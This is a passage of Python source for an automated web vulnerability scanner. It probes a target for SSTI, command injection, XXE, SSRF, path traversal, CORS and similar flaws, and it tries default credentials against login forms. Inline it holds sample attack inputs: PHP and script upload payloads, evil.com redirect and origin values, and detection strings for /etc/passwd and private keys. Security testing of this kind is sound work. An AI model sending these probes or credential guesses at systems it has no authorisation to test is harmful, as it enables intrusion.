                        remediation="Implement anti-CSRF tokens for all state-changing operations",
                        cwe_id="CWE-352",
                        cvss_score=6.5
                    )

        # Check SameSite cookie attribute
        response = self._send_request(self.base_url)
        if response and self.session.cookies:
            for cookie in self.session.cookies:
                if 'session' in cookie.name.lower() or 'auth' in cookie.name.lower():
                    samesite = cookie.get_nonstandard_attr('samesite', '').lower()
                    if samesite not in ['strict', 'lax']:
                        self._add_finding(
                            "CSRF - Weak SameSite Cookie",
                            Severity.MEDIUM,
                            self.base_url,
                            f"Session cookie '{cookie.name}' lacks proper SameSite attribute",
                            evidence=f"SameSite: {samesite or 'Not Set'}",
                            remediation="Set SameSite=Strict or SameSite=Lax for session cookies",
                            cwe_id="CWE-352"
                        )
        
        logger.info("CSRF testing complete.")

    def test_ssti(self):
        """Test for Server-Side Template Injection vulnerabilities."""
        logger.info("📄 Testing for SSTI vulnerabilities...")
        
        # Test URL parameters
        parsed = urlparse(self.base_url)
        if parsed.query:
            query_params = parse_qs(parsed.query)
            
            for param_name in query_params:
                for payload in self.ssti_payloads:
                    test_params = query_params.copy()
                    test_params[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                    
                    response = self._send_request(test_url)
                    if response:
                        # Check for evaluated expressions
                        if payload == "{{7*7}}" and "49" in response.text:
                            self._add_finding(
                                "Server-Side Template Injection (SSTI)",
                                Severity.CRITICAL,
                                test_url,
                                f"SSTI detected in parameter '{param_name}' (Jinja2/Twig style)",
                                payload=payload,
                                evidence=response.text[:500],
                                remediation="Avoid passing user input directly to template engines",
                                cwe_id="CWE-94",
                                cvss_score=9.8
                            )
                            break
                        elif payload == "${7*7}" and "49" in response.text:
                            self._add_finding(
                                "Server-Side Template Injection (SSTI)",
                                Severity.CRITICAL,
                                test_url,
                                f"SSTI detected in parameter '{param_name}' (Freemarker/Velocity style)",
                                payload=payload,
                                evidence=response.text[:500],
                                remediation="Avoid passing user input directly to template engines",
                                cwe_id="CWE-94",
                                cvss_score=9.8
                            )
                            break

        # Test discovered forms
        for form in self.discovered_forms:
            for input_name in form['inputs']:
                for payload in self.ssti_payloads[:5]:
                    test_data = {name: form['inputs'][name].get('value', 'test') for name in form['inputs']}
                    test_data[input_name] = payload
                    
                    response = self._send_request(form['url'], method=form['method'], data=test_data)
                    if response and "49" in response.text and "7*7" in payload:
                        self._add_finding(
                            "Server-Side Template Injection (SSTI)",
                            Severity.CRITICAL,
                            form['url'],
                            f"SSTI detected in form field '{input_name}'",
                            payload=payload,
                            evidence=response.text[:500],
                            remediation="Avoid passing user input directly to template engines",
                            cwe_id="CWE-94",
                            cvss_score=9.8
                        )
                        break
        
        logger.info("SSTI testing complete.")

    def test_command_injection(self):
        """Test for Command Injection vulnerabilities."""
        logger.info("⚡ Testing for Command Injection vulnerabilities...")
        
        # Test URL parameters
        parsed = urlparse(self.base_url)
        if parsed.query:
            query_params = parse_qs(parsed.query)
            
            for param_name in query_params:
                for payload in self.cmd_payloads[:8]:
                    test_params = query_params.copy()
                    test_params[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                    
                    response = self._send_request(test_url)
                    if response and self._check_cmd_injection_response(response.text):
                        self._add_finding(
                            "Command Injection",
                            Severity.CRITICAL,
                            test_url,
                            f"Command injection detected in parameter '{param_name}'",
                            payload=payload,
                            evidence=response.text[:500],
                            remediation="Avoid passing user input to system commands; use safe APIs",
                            cwe_id="CWE-78",
                            cvss_score=9.8
                        )
                        break

        # Test forms
        for form in self.discovered_forms:
            for input_name in form['inputs']:
                for payload in self.cmd_payloads[:5]:
                    test_data = {name: form['inputs'][name].get('value', 'test') for name in form['inputs']}
                    test_data[input_name] = payload
                    
                    response = self._send_request(form['url'], method=form['method'], data=test_data)
                    if response and self._check_cmd_injection_response(response.text):
                        self._add_finding(
                            "Command Injection",
                            Severity.CRITICAL,
                            form['url'],
                            f"Command injection detected in form field '{input_name}'",
                            payload=payload,
                            evidence=response.text[:500],
                            remediation="Avoid passing user input to system commands; use safe APIs",
                            cwe_id="CWE-78",
                            cvss_score=9.8
                        )
                        break
        
        logger.info("Command Injection testing complete.")

    def _check_cmd_injection_response(self, content: str) -> bool:
        """Check for common command injection indicators."""
        indicators = [
            "root:x:0:0",  # /etc/passwd
            "uid=", "gid=",  # id command
            "Directory of",  # Windows dir
            "Volume in drive",  # Windows
            "total ", "drwx",  # ls -la
            "PING ", "Reply from",  # ping
            "whoami",  # whoami output
        ]
        return any(indicator in content for indicator in indicators)

    def test_xxe(self):
        """Test for XML External Entity (XXE) vulnerabilities."""
        logger.info("📋 Testing for XXE vulnerabilities...")
        
        # Check for XML processing endpoints
        xml_paths = ['/api', '/xml', '/soap', '/wsdl', '/rss', '/feed', '/import', '/upload']
        
        headers = {"Content-Type": "application/xml"}
        
        for path in xml_paths:
            test_url = urljoin(self.base_url, path)
            
            for payload in self.xxe_payloads:
                response = self._send_request(test_url, method="POST", data=payload, headers=headers)
                
                if response:
                    # Check for file content disclosure
                    if "root:x:0:0" in response.text or "localhost" in response.text:
                        self._add_finding(
                            "XML External Entity (XXE)",
                            Severity.CRITICAL,
                            test_url,
                            "XXE vulnerability detected - external entity processed",
                            payload=payload[:200],
                            evidence=response.text[:500],
                            remediation="Disable external entity processing in XML parser",
                            cwe_id="CWE-611",
                            cvss_score=9.1
                        )
                        break
                    # Check for XXE error messages
                    elif any(err in response.text.lower() for err in ["xml parsing error", "entity", "dtd"]):
                        self._add_finding(
                            "Potential XXE Vulnerability",
                            Severity.MEDIUM,
                            test_url,
                            "XML parsing errors detected - may indicate XXE vulnerability",
                            payload=payload[:200],
                            evidence=response.text[:500],
                            remediation="Disable external entity processing in XML parser",
                            cwe_id="CWE-611"
                        )
        
        logger.info("XXE testing complete.")

    def test_ssrf(self):
        """Test for Server-Side Request Forgery vulnerabilities."""
        logger.info("🌐 Testing for SSRF vulnerabilities...")
        
        # Common SSRF parameters
        ssrf_params = ['url', 'uri', 'path', 'dest', 'redirect', 'site', 'html', 'feed', 'ref', 'callback', 'load']
        
        parsed = urlparse(self.base_url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        for param in ssrf_params:
            for payload in self.ssrf_payloads:
                test_url = f"{base}?{param}={quote(payload)}"
                
                response = self._send_request(test_url, timeout=15)
                
                if response:
                    # Check for internal service responses
                    ssrf_indicators = [
                        "127.0.0.1", "localhost", "internal",
                        "metadata", "instance-identity", "ami-id",
                        "SSH-", "220 ", "mysql", "redis",
                        "root:x:", "PRIVATE KEY"
                    ]
                    
                    if any(ind in response.text for ind in ssrf_indicators):
                        self._add_finding(
                            "Server-Side Request Forgery (SSRF)",
                            Severity.HIGH,
                            test_url,
                            f"SSRF detected via parameter '{param}'",
                            payload=payload,
                            evidence=response.text[:500],
                            remediation="Validate and whitelist allowed URLs; block internal addresses",
                            cwe_id="CWE-918",
                            cvss_score=7.5
                        )
                        break
        
        logger.info("SSRF testing complete.")

    def test_ldap_injection(self):
        """Test for LDAP Injection vulnerabilities."""
        logger.info("📂 Testing for LDAP Injection vulnerabilities...")
        
        # Test URL parameters that might use LDAP
        parsed = urlparse(self.base_url)
        if parsed.query:
            query_params = parse_qs(parsed.query)
            ldap_params = ['user', 'username', 'uid', 'name', 'cn', 'search', 'query', 'filter']
            
            for param_name in query_params:
                if any(ldap in param_name.lower() for ldap in ldap_params):
                    for payload in self.ldap_payloads:
                        test_params = query_params.copy()
                        test_params[param_name] = [payload]
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                        
                        response = self._send_request(test_url)
                        
                        if response:
                            ldap_errors = [
                                "ldap_", "invalid dn syntax", "bad search filter",
                                "invalid filter", "ldap error", "object class violation"
                            ]
                            
                            if any(err in response.text.lower() for err in ldap_errors):
                                self._add_finding(
                                    "LDAP Injection",
                                    Severity.HIGH,
                                    test_url,
                                    f"LDAP injection detected in parameter '{param_name}'",
                                    payload=payload,
                                    evidence=response.text[:500],
                                    remediation="Use parameterized LDAP queries and input validation",
                                    cwe_id="CWE-90",
                                    cvss_score=7.5
                                )
                                break
        
        logger.info("LDAP Injection testing complete.")

    def test_insecure_file_upload(self):
        """Test for insecure file upload vulnerabilities."""
        logger.info("📁 Testing for Insecure File Upload vulnerabilities...")
        
        upload_paths = ['/upload', '/uploads', '/files', '/admin/upload', '/api/upload', '/file/upload']
        
        # Test with various dangerous file types
        test_files = [
            ("test.php", b"<?php echo 'test'; ?>", "application/x-php"),
            ("test.jsp", b"<% out.println('test'); %>", "text/x-jsp"),
            ("test.aspx", b"<%@ Page Language='C#' %>", "text/x-aspx"),
            ("test.html", b"<script>alert(1)</script>", "text/html"),
            ("test.svg", b"<svg onload=alert(1)>", "image/svg+xml"),
            ("test.php.jpg", b"<?php echo 'test'; ?>", "image/jpeg"),  # Double extension
        ]

        for path in upload_paths:
            test_url = urljoin(self.base_url, path)
            
            for filename, content, mimetype in test_files:
                files = {"file": (filename, content, mimetype)}
                
                response = self._send_request(test_url, method="POST", files=files)
                
                if response and response.status_code < 400:
                    if "upload" in response.text.lower() and "success" in response.text.lower():
                        self._add_finding(
                            "Insecure File Upload",
                            Severity.HIGH,
                            test_url,
                            f"Potentially dangerous file type accepted: {filename}",
                            payload=filename,
                            evidence=response.text[:500],
                            remediation="Validate file types, use whitelisting, and store files outside webroot",
                            cwe_id="CWE-434",
                            cvss_score=8.8
                        )
                        break
        
        logger.info("File Upload testing complete.")

    def test_directory_traversal(self):
        """Test for Directory Traversal / Path Traversal vulnerabilities."""
        logger.info("📂 Testing for Directory Traversal vulnerabilities...")
        
        # Common parameters for file inclusion
        file_params = ['file', 'page', 'path', 'include', 'template', 'doc', 'folder', 'img', 'filename']
        
        parsed = urlparse(self.base_url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        for param in file_params:
            for payload in self.dir_payloads:
                test_url = f"{base}?{param}={quote(payload)}"
                
                response = self._send_request(test_url)
                
                if response and response.status_code == 200:
                    sensitive_patterns = [
                        "root:x:0:0", "root:*:0:0",  # Unix passwd
                        "[boot loader]", "[operating systems]",  # Windows boot.ini
                        "localhost", "127.0.0.1",  # hosts file
                        "<?php", "<?=",  # PHP source
                    ]
                    
                    if any(pattern in response.text for pattern in sensitive_patterns):
                        self._add_finding(
                            "Directory Traversal / Path Traversal",
                            Severity.HIGH,
                            test_url,
                            f"Path traversal detected via parameter '{param}'",
                            payload=payload,
                            evidence=response.text[:500],
                            remediation="Use basename() and validate paths against allowed directories",
                            cwe_id="CWE-22",
                            cvss_score=7.5
                        )
                        break
        
        # Test discovered forms
        for form in self.discovered_forms:
            for input_name in form['inputs']:
                if any(fp in input_name.lower() for fp in file_params):
                    for payload in self.dir_payloads[:5]:
                        test_data = {name: form['inputs'][name].get('value', 'test') for name in form['inputs']}
                        test_data[input_name] = payload
                        
                        response = self._send_request(form['url'], method=form['method'], data=test_data)
                        
                        if response and "root:x:0:0" in response.text:
                            self._add_finding(
                                "Directory Traversal / Path Traversal",
                                Severity.HIGH,
                                form['url'],
                                f"Path traversal detected in form field '{input_name}'",
                                payload=payload,
                                evidence=response.text[:500],
                                remediation="Use basename() and validate paths against allowed directories",
                                cwe_id="CWE-22",
                                cvss_score=7.5
                            )
                            break
        
        logger.info("Directory Traversal testing complete.")

    def test_weak_credentials(self):
        """Test for weak/default credentials."""
        logger.info("🔑 Testing for Weak Credentials...")
        
        login_paths = ['/login', '/admin', '/signin', '/wp-login.php', '/user/login', '/auth', '/authenticate']
        
        discovered_login_forms = [
            f for f in self.discovered_forms 
            if any(p in f['url'].lower() for p in ['login', 'signin', 'auth', 'admin'])
        ]
        
        if not discovered_login_forms:
            logger.info("No login forms discovered. Testing common paths...")
            test_targets = [(urljoin(self.base_url, path), 'POST') for path in login_paths]
        else:
            logger.info(f"Found {len(discovered_login_forms)} potential login forms.")
            test_targets = [(form['url'], form['method']) for form in discovered_login_forms]

        success_indicators = [
            "logout", "dashboard", "welcome", "profile", 
            "control panel", "administration", "success", "redirect"
        ]
        failure_indicators = [
            "invalid", "incorrect", "failed", "wrong", "error", "denied"
        ]
        
        for target_url, method in test_targets:
            form = next((f for f in discovered_login_forms if f['url'] == target_url), None)
            
            # Identify username/password fields
            user_field = None
            pass_field = None
            
            if form:
                for name, details in form['inputs'].items():
                    name_lower = name.lower()
                    if any(u in name_lower for u in ['user', 'email', 'login', 'name']):
                        user_field = name
                    elif details.get('type') == 'password' or 'pass' in name_lower:
                        pass_field = name
            
            user_field = user_field or 'username'
            pass_field = pass_field or 'password'
            
            logger.debug(f"Testing login at {target_url}")
            
            for username in self.weak_usernames[:5]:  # Limit to avoid lockouts
                for password in self.weak_passwords[:5]:
                    data = {user_field: username, pass_field: password}
                    
                    if form:
                        for name, details in form['inputs'].items():
                            if name not in [user_field, pass_field] and details.get('type') == 'hidden':
                                data[name] = details.get('value', '')
                    
                    response = self._send_request(target_url, method=method, data=data)
                    
                    if response:
                        response_lower = response.text.lower()
                        
                        # Check for successful login
                        if any(ind in response_lower for ind in success_indicators):
                            if not any(fail in response_lower for fail in failure_indicators):
                                self._add_finding(
                                    "Weak Credentials",
                                    Severity.CRITICAL,
                                    target_url,
                                    f"Weak credentials found: {username}:{password}",
                                    payload=f"{username}:{password}",
                                    remediation="Enforce strong password policies and implement account lockout",
                                    cwe_id="CWE-521",
                                    cvss_score=9.1
                                )
                                logger.info(f"✓ Found weak credentials at {target_url}")
                                return  # Stop after finding valid creds
        
        logger.info("Weak Credentials testing complete.")


    def test_http_headers(self):
        """Test for missing or insecure HTTP security headers."""
        logger.info("🔒 Testing HTTP Security Headers...")
        
        response = self._send_request(self.base_url)
        if not response:
            logger.error("Cannot test headers; initial request failed.")
            return

        headers = response.headers

        # Strict-Transport-Security (HSTS)
        if 'Strict-Transport-Security' not in headers:
            if self.base_url.startswith("https://"):
                self._add_finding(
                    "Missing Security Header - HSTS",
                    Severity.MEDIUM,
                    self.base_url,
                    "Strict-Transport-Security header not set - vulnerable to downgrade attacks",
                    remediation="Add 'Strict-Transport-Security: max-age=31536000; includeSubDomains'",
                    cwe_id="CWE-319"
                )
        else:
            hsts = headers['Strict-Transport-Security']
            if 'max-age' in hsts:
                try:
                    max_age = int(hsts.split('max-age=')[1].split(';')[0])
                    if max_age < 31536000:  # Less than 1 year
                        self._add_finding(
                            "Weak Security Header - HSTS",
                            Severity.LOW,
                            self.base_url,
                            f"HSTS max-age is too short ({max_age}s)",
                            evidence=hsts,
                            remediation="Set max-age to at least 31536000 (1 year)"
                        )
                except (ValueError, IndexError):
                    pass

        # Content-Security-Policy (CSP)
        if 'Content-Security-Policy' not in headers:
            self._add_finding(
                "Missing Security Header - CSP",
                Severity.MEDIUM,
                self.base_url,
                "Content-Security-Policy header not set - increased XSS risk",
                remediation="Implement a strict Content-Security-Policy",
                cwe_id="CWE-1021"
            )
        else:
            csp = headers['Content-Security-Policy']
            if "'unsafe-inline'" in csp:
                self._add_finding(
                    "Weak Security Header - CSP",
                    Severity.MEDIUM,
                    self.base_url,
                    "CSP allows 'unsafe-inline' - reduces XSS protection",
                    evidence=csp[:200],
                    remediation="Remove 'unsafe-inline' and use nonces or hashes"
                )
            if "'unsafe-eval'" in csp:
                self._add_finding(
                    "Weak Security Header - CSP",
                    Severity.MEDIUM,
                    self.base_url,
                    "CSP allows 'unsafe-eval' - allows eval() execution",
                    evidence=csp[:200],
                    remediation="Remove 'unsafe-eval' directive"
                )
            if "default-src *" in csp or "script-src *" in csp:
                self._add_finding(
                    "Weak Security Header - CSP",
                    Severity.HIGH,
                    self.base_url,
                    "CSP uses overly permissive wildcard (*)",
                    evidence=csp[:200],
                    remediation="Restrict sources to specific trusted domains"
                )

        # X-Frame-Options
        xfo = headers.get('X-Frame-Options', '').upper()
        csp_frame = 'frame-ancestors' in headers.get('Content-Security-Policy', '')
        
        if not xfo and not csp_frame:
            self._add_finding(
                "Missing Security Header - X-Frame-Options",
                Severity.MEDIUM,
                self.base_url,
                "X-Frame-Options not set - vulnerable to Clickjacking",
                remediation="Add 'X-Frame-Options: DENY' or 'X-Frame-Options: SAMEORIGIN'",
                cwe_id="CWE-1021"
            )
        elif xfo and xfo not in ['DENY', 'SAMEORIGIN']:
            self._add_finding(
                "Weak Security Header - X-Frame-Options",
                Severity.LOW,
                self.base_url,
                f"X-Frame-Options has weak value: {xfo}",
                remediation="Set X-Frame-Options to DENY or SAMEORIGIN"
            )

        # X-Content-Type-Options
        if headers.get('X-Content-Type-Options', '').lower() != 'nosniff':
            self._add_finding(
                "Missing Security Header - X-Content-Type-Options",
                Severity.LOW,
                self.base_url,
                "X-Content-Type-Options not set to 'nosniff'",
                remediation="Add 'X-Content-Type-Options: nosniff'",
                cwe_id="CWE-16"
            )

        # X-XSS-Protection
        xxss = headers.get('X-XSS-Protection', '')
        if not xxss or xxss == '0':
            self._add_finding(
                "Missing/Disabled Security Header - X-XSS-Protection",
                Severity.LOW,
                self.base_url,
                "X-XSS-Protection not enabled",
                remediation="Add 'X-XSS-Protection: 1; mode=block'"
            )

        # Referrer-Policy
        if 'Referrer-Policy' not in headers:
            self._add_finding(
                "Missing Security Header - Referrer-Policy",
                Severity.LOW,
                self.base_url,
                "Referrer-Policy not set - may leak sensitive information",
                remediation="Add 'Referrer-Policy: strict-origin-when-cross-origin'"
            )

        # Permissions-Policy
        if 'Permissions-Policy' not in headers and 'Feature-Policy' not in headers:
            self._add_finding(
                "Missing Security Header - Permissions-Policy",
                Severity.LOW,
                self.base_url,
                "Permissions-Policy not set",
                remediation="Add Permissions-Policy to restrict browser features"
            )

        # Information Leakage Headers
        server_header = headers.get('Server', '')
        if server_header and any(char.isdigit() for char in server_header):
            self._add_finding(
                "Information Disclosure - Server Header",
                Severity.LOW,
                self.base_url,
                f"Server header reveals version information: {server_header}",
                evidence=server_header,
                remediation="Remove or obscure Server header version information",
                cwe_id="CWE-200"
            )

        x_powered_by = headers.get('X-Powered-By', '')
        if x_powered_by:
            self._add_finding(
                "Information Disclosure - X-Powered-By",
                Severity.LOW,
                self.base_url,
                f"X-Powered-By header reveals technology: {x_powered_by}",
                evidence=x_powered_by,
                remediation="Remove X-Powered-By header",
                cwe_id="CWE-200"
            )

        logger.info("HTTP Security Headers testing complete.")

    def test_clickjacking(self):
        """Test specifically for Clickjacking vulnerabilities."""
        logger.info("🖱️ Testing for Clickjacking vulnerabilities...")
        
        response = self._send_request(self.base_url)
        if not response:
            return

        headers = response.headers
        xfo = headers.get('X-Frame-Options', '').upper()
        csp = headers.get('Content-Security-Policy', '')

        if not xfo and 'frame-ancestors' not in csp:
            self._add_finding(
                "Clickjacking Vulnerability",
                Severity.MEDIUM,
                self.base_url,
                "Page can be embedded in iframes - vulnerable to Clickjacking",
                remediation="Add X-Frame-Options: DENY or CSP frame-ancestors directive",
                cwe_id="CWE-1021",
                cvss_score=4.3
            )
        elif xfo and xfo not in ['DENY', 'SAMEORIGIN']:
            self._add_finding(
                "Weak Clickjacking Protection",
                Severity.LOW,
                self.base_url,
                f"X-Frame-Options has weak configuration: {xfo}",
                remediation="Set X-Frame-Options to DENY or SAMEORIGIN"
            )
        
        logger.info("Clickjacking testing complete.")

    def test_open_redirect(self):
        """Test for Open Redirect vulnerabilities."""
        logger.info("↩️ Testing for Open Redirect vulnerabilities...")
        
        redirect_params = ['redirect', 'url', 'next', 'dest', 'destination', 'redir', 'return', 'returnTo', 'goto', 'link', 'target']
        external_targets = [
            "https://evil.com",
            "//evil.com",
            "https://evil.com%2f%2f",
            "\\\\evil.com",
            "https:evil.com",
            "/\\evil.com",
            "////evil.com"
        ]
        
        parsed = urlparse(self.base_url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for param in redirect_params:
            for target in external_targets:
                test_url = f"{base}?{param}={quote(target)}"
                
                response = self._send_request(test_url, allow_redirects=False)
                
                if response and response.is_redirect:
                    location = response.headers.get('Location', '')
                    
                    # Check if redirected to external domain
                    if 'evil.com' in location.lower():
                        self._add_finding(
                            "Open Redirect",
                            Severity.MEDIUM,
                            test_url,
                            f"Open redirect via '{param}' parameter",
                            payload=target,
                            evidence=f"Location: {location}",
                            remediation="Validate redirect URLs against a whitelist of allowed domains",
                            cwe_id="CWE-601",
                            cvss_score=4.7
                        )
                        break
        
        logger.info("Open Redirect testing complete.")

    def test_insecure_communication(self):
        """Test for insecure communication issues."""
        logger.info("🔐 Testing for Insecure Communication...")
        
        if not self.base_url.startswith("https"):
            self._add_finding(
                "Insecure Communication - HTTP",
                Severity.HIGH,
                self.base_url,
                "Website served over HTTP - data transmitted in plaintext",
                remediation="Enable HTTPS with a valid TLS certificate",
                cwe_id="CWE-319",
                cvss_score=7.5
            )
        else:
            # Test SSL/TLS configuration
            try:
                hostname = self.parsed_url.hostname
                port = self.parsed_url.port or 443
                
                context = ssl.create_default_context()
                with socket.create_connection((hostname, port), timeout=5) as sock:
                    with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                        cert = ssock.getpeercert()
                        cipher = ssock.cipher()
                        version = ssock.version()
                        
                        # Check TLS version
                        if version in ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.1']:
                            self._add_finding(
                                "Weak TLS Version",
                                Severity.MEDIUM,
                                self.base_url,
                                f"Server supports outdated TLS version: {version}",
                                evidence=f"TLS Version: {version}",
                                remediation="Disable TLS 1.0 and 1.1; use TLS 1.2 or higher",
                                cwe_id="CWE-326"
                            )
                        
                        # Check cipher strength
                        if cipher and cipher[2] < 128:
                            self._add_finding(
                                "Weak Cipher Suite",
                                Severity.MEDIUM,
                                self.base_url,
                                f"Server uses weak cipher: {cipher[0]} ({cipher[2]} bits)",
                                evidence=f"Cipher: {cipher}",
                                remediation="Configure server to use strong cipher suites only",
                                cwe_id="CWE-327"
                            )
                        
                        # Check certificate expiration
                        if cert:
                            not_after = cert.get('notAfter', '')
                            if not_after:
                                try:
                                    from datetime import datetime as dt
                                    exp_date = dt.strptime(not_after, '%b %d %H:%M:%S %Y %Z')
                                    days_until_expiry = (exp_date - datetime.now()).days
                                    
                                    if days_until_expiry < 0:
                                        self._add_finding(
                                            "Expired SSL Certificate",
                                            Severity.HIGH,
                                            self.base_url,
                                            "SSL certificate has expired",
                                            evidence=f"Expired on: {not_after}",
                                            remediation="Renew the SSL certificate immediately",
                                            cwe_id="CWE-295"
                                        )
                                    elif days_until_expiry < 30:
                                        self._add_finding(
                                            "SSL Certificate Expiring Soon",
                                            Severity.LOW,
                                            self.base_url,
                                            f"SSL certificate expires in {days_until_expiry} days",
                                            evidence=f"Expires on: {not_after}",
                                            remediation="Renew the SSL certificate before expiration"
                                        )
                                except (ValueError, KeyError):
                                    pass
                                    
            except ssl.SSLError as e:
                self._add_finding(
                    "SSL/TLS Error",
                    Severity.HIGH,
                    self.base_url,
                    f"SSL/TLS configuration issue: {str(e)}",
                    remediation="Review and fix SSL/TLS configuration",
                    cwe_id="CWE-295"
                )
            except Exception as e:
                logger.debug(f"SSL check error: {e}")
        
        # Check for mixed content
        response = self._send_request(self.base_url)
        if response and self.base_url.startswith("https://"):
            if 'http://' in response.text and 'src=' in response.text.lower():
                self._add_finding(
                    "Mixed Content",
                    Severity.LOW,
                    self.base_url,
                    "Page may include resources loaded over HTTP",
                    remediation="Ensure all resources are loaded over HTTPS",
                    cwe_id="CWE-319"
                )
        
        logger.info("Insecure Communication testing complete.")

    def test_cookie_security(self):
        """Test for cookie security issues."""
        logger.info("🍪 Testing Cookie Security...")
        
        response = self._send_request(self.base_url)
        if not response:
            return

        if not self.session.cookies:
            logger.info("No cookies set by the server.")
            return

        for cookie in self.session.cookies:
            issues = []
            
            # Check Secure flag
            if not cookie.secure and self.base_url.startswith("https"):
                issues.append("missing Secure flag")
            
            # Check HttpOnly flag
            is_session_cookie = any(
                name in cookie.name.lower() 
                for name in ['session', 'auth', 'token', 'login', 'user', 'jwt']
            )
            
            if not cookie.has_nonstandard_attr('httponly'):
                if is_session_cookie:
                    issues.append("missing HttpOnly flag (session cookie)")
            
            # Check SameSite attribute
            samesite = cookie.get_nonstandard_attr('samesite', '').lower()
            if not samesite or samesite == 'none':
                issues.append(f"missing/weak SameSite attribute ({samesite or 'not set'})")
            
            # Check for sensitive names without protection
            if is_session_cookie and issues:
                self._add_finding(
                    "Insecure Cookie Configuration",
                    Severity.MEDIUM,
                    self.base_url,
                    f"Cookie '{cookie.name}' has security issues: {', '.join(issues)}",
                    evidence=f"Cookie: {cookie.name}",
                    remediation="Set Secure, HttpOnly, and SameSite=Strict for session cookies",
                    cwe_id="CWE-614"
                )
        
        logger.info("Cookie Security testing complete.")
        
    # --- Add other test methods from the original code here, adapting them similarly ---
    # e.g., test_insufficient_logging_monitoring (hard to automate well)
    # e.g., test_brute_force_protection (needs refinement like weak creds test)
    # e.g., test_ssrf (highly context-dependent, hard to generalize)
    # e.g., test_cors (needs requests from a different origin, complex for basic script)
    # e.g., test_broken_access_control (requires knowledge of roles/paths)

    def test_cors(self):
        """Test for Cross-Origin Resource Sharing (CORS) misconfigurations."""
        logger.info("🌍 Testing CORS configuration...")
        
        # Test with various Origin headers
        test_origins = [
            "https://evil.com",
            "null",
            f"https://{self.parsed_url.netloc}.evil.com",
            f"https://evil.{self.parsed_url.netloc}",
        ]
        
        for origin in test_origins:
            headers = {"Origin": origin}
            response = self._send_request(self.base_url, headers=headers)
            
            if response:
                acao = response.headers.get('Access-Control-Allow-Origin', '')
                acac = response.headers.get('Access-Control-Allow-Credentials', '')
                
                # Check for wildcard with credentials
                if acao == '*':
                    self._add_finding(
                        "CORS Misconfiguration - Wildcard Origin",
                        Severity.MEDIUM,
                        self.base_url,
                        "CORS allows any origin (*)",
                        evidence=f"Access-Control-Allow-Origin: {acao}",
                        remediation="Restrict CORS to specific trusted origins",
                        cwe_id="CWE-942"
                    )
                    break
                
                # Check if evil origin is reflected
                if origin in acao and origin != "null":
                    if acac.lower() == 'true':
                        self._add_finding(
                            "CORS Misconfiguration - Reflected Origin with Credentials",
                            Severity.HIGH,
                            self.base_url,
                            f"CORS reflects arbitrary origin and allows credentials",
                            payload=origin,
                            evidence=f"ACAO: {acao}, ACAC: {acac}",
                            remediation="Implement strict origin validation; don't reflect arbitrary origins",
                            cwe_id="CWE-942",
                            cvss_score=8.1
                        )
                    else:
                        self._add_finding(
                            "CORS Misconfiguration - Reflected Origin",
                            Severity.MEDIUM,
                            self.base_url,
                            f"CORS reflects arbitrary origin",
                            payload=origin,
                            evidence=f"Access-Control-Allow-Origin: {acao}",
                            remediation="Implement strict origin validation",
                            cwe_id="CWE-942"
                        )
                    break
                
                # Check for null origin
                if acao == 'null':
                    self._add_finding(
                        "CORS Misconfiguration - Null Origin Allowed",
                        Severity.MEDIUM,
                        self.base_url,
                        "CORS allows 'null' origin",
                        evidence=f"Access-Control-Allow-Origin: null",
                        remediation="Do not allow 'null' as a valid origin",
                        cwe_id="CWE-942"
                    )
                    break
        
        logger.info("CORS testing complete.")

    def test_api_security(self):
        """Test common API security issues."""
        logger.info("🔗 Testing API Security...")
        
        # Common API paths to test
        api_paths = [
            '/api', '/api/v1', '/api/v2', '/api/users', '/api/admin',
            '/graphql', '/rest', '/swagger', '/swagger-ui', '/api-docs',
            '/openapi.json', '/swagger.json', '/api/swagger.json',
            '/.well-known/openapi.json', '/v1', '/v2'
        ]
        
        for path in api_paths:
            test_url = urljoin(self.base_url, path)
            response = self._send_request(test_url)
            
            if response and response.status_code == 200:
                # Check for exposed API documentation
                if any(doc in response.text.lower() for doc in ['swagger', 'openapi', 'api-docs']):
                    self._add_finding(
                        "Exposed API Documentation",
                        Severity.LOW,
                        test_url,
                        "API documentation is publicly accessible",
                        evidence=response.text[:200],
                        remediation="Restrict access to API documentation in production",
                        cwe_id="CWE-200"
                    )
                
                # Check for verbose error messages in API
                if 'error' in response.text.lower() or 'exception' in response.text.lower():
                    if any(detail in response.text.lower() for detail in ['stack', 'trace', 'line', 'file']):
                        self._add_finding(
                            "Verbose API Error Messages",
                            Severity.LOW,
                            test_url,
                            "API returns detailed error information",
                            evidence=response.text[:300],
                            remediation="Return generic error messages in production",
                            cwe_id="CWE-209"
                        )
        
        # Test rate limiting
        self._test_rate_limiting()
        
        # Test HTTP methods
        self._test_http_methods()
        
        logger.info("API Security testing complete.")

    def _test_rate_limiting(self):
        """Test if rate limiting is implemented."""
        logger.info("Testing rate limiting...")
        
        # Send multiple rapid requests
        responses = []
        for _ in range(15):
            response = self._send_request(self.base_url)
            if response:
                responses.append(response.status_code)
        
        # Check if any rate limiting headers exist or 429 response
        if responses and 429 not in responses:
            # Check for rate limit headers in last response
            test_response = self._send_request(self.base_url)
            if test_response:
                rate_headers = ['X-RateLimit-Limit', 'X-RateLimit-Remaining', 'Retry-After', 'X-Rate-Limit']
                has_rate_limiting = any(h in test_response.headers for h in rate_headers)
                
                if not has_rate_limiting:
                    self._add_finding(
                        "Missing Rate Limiting",
                        Severity.LOW,
                        self.base_url,
                        "No rate limiting detected - susceptible to brute force attacks",
                        remediation="Implement rate limiting for all endpoints",
                        cwe_id="CWE-770"
                    )

    def _test_http_methods(self):
        """Test for dangerous HTTP methods."""
        logger.info("Testing HTTP methods...")
        
        dangerous_methods = ['PUT', 'DELETE', 'TRACE', 'CONNECT']
        
        # First check OPTIONS to see what's allowed
        response = self._send_request(self.base_url, method="OPTIONS")
        if response:
            allow_header = response.headers.get('Allow', '')
            
            for method in dangerous_methods:
                if method in allow_header.upper():
                    if method == 'TRACE':
                        self._add_finding(
                            "Dangerous HTTP Method Enabled - TRACE",
                            Severity.LOW,
                            self.base_url,
                            "TRACE method enabled - potential XST vulnerability",
